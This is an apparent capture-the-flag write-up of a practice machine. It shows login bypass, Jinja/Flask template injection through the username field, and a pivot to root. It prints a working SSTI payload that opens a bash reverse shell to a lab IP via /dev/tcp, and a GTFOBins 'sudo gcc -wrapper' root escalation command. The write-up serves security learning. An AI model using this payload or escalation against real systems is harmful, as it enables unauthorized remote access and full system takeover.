- There're two ports opened, 22 has ssh and 80 has an apache webserver
- Let's visit the web page

### Website
![login-page](https://i.imgur.com/sPx1JbN.png)
- Here's a login page, but we don't have any credentials
- Let's try with `admin:admin`

![welcome-admin](https://i.imgur.com/4QPXx0u.png)
- It worked, let's try with other credentials, for example `test:test` 

![test-test](https://i.imgur.com/GaMTlpo.png)
- I think there's no login check, it simply logs us in with any credentials
- And our username is reflecting here `[ Welcome test, It's late the CTF has ended ]`
- Let's enum other pages

### CTF site
- This is a mini CTF site
- Sadly the CTF has ended
- There are two web challenges, which still active
- But it's not hosted inside this machine, Its publicly hosted so we can't make use of that challenges
- There's a scoreboard and users pages
- This page uses a cookie `user:test`
- Our username will be stored there
- Nothing interesting than our reflected input and cookies

![static](https://i.imgur.com/tDGnVnP.png)
- By viewing the source there's a folder name `static`
- So let's try for **SSTI** 

#### SSTI
- I used ![7*7](https://i.imgur.com/b8rE1NY.png) as my username

![ssti](https://i.imgur.com/vDKsJQA.png)

- It works :D
- So this is a flask app has SSTI
- Let's try to get a reverse shell

![rev-payload](https://i.imgur.com/oO8kGam.png)
<!--{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.85.203/1337 0>&1"').read()}} -->

![shell as www-data](https://i.imgur.com/2t8obfL.png)
- Cool we got shell :D

### User part
![credentials-pwn](https://i.imgur.com/elLKb0X.png)
- We can't see user.txt but we got credetials for pwn user
- There's a todo.txt in `/home/pwn` and a password is there
- Let's try this to login as `pwn`

![user.txt](https://i.imgur.com/NkC2IZ6.png)
- Nice we got user
- Let's upgrade our shell

### Root part
![sudo -l](https://i.imgur.com/ce66c7y.png)
- By running `sudo -l` we can see that `pwn` user can run `/usr/bin/gcc` with sudo

![gtfobins](https://i.imgur.com/SkM5TJg.png)
- Quickly I searched in gtfobins and it has gcc

![sudo gcc](https://i.imgur.com/PkdeFP1.png)
- Let's run this command 

`sudo gcc -wrapper /bin/sh,-s .`

![rooted](https://i.imgur.com/eFP7fHl.png)
- Cool we rooted :D
- That's all guys, I hope you liked this box <3
